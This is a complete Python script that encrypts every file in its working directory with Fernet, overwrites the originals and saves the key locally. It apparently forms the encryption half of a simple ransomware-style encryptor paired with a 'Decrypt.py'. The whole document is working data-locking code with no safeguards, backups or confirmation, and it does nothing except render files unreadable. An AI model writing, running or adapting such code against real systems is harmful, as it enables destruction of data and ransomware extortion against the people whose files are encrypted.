# pip install cryptography
import os
from cryptography.fernet import Fernet


file_Names = []

# Reading the all files on directory except program files
for file in os.listdir():
	if file in  ["Encrypt.py" , "Decrypt.py" , "SecretKey.key"]:
		continue

	if os.path.isfile(file):
		file_Names.append(file)


# Generating the secret key
secret_Key = Fernet.generate_key()


# Writing the secret key to a file
with open("SecretKey.key","wb") as secret_Key_File:
	secret_Key_File.write(secret_Key)


# Encrypting the data in each file
for file in file_Names:
	
	# Store the content of the file
	with open(file,"rb") as encrypt_File:
		contents = encrypt_File.read()
	
	# Apply encryption to data using the key
	contents_Encrypted = Fernet(secret_Key).encrypt(contents)

	# Writing encrypted data to orginal file
	with open(file,"wb") as encrypt_File:
		encrypt_File.write(contents_Encrypted)

		print(f"[+] The {file} is encrypted")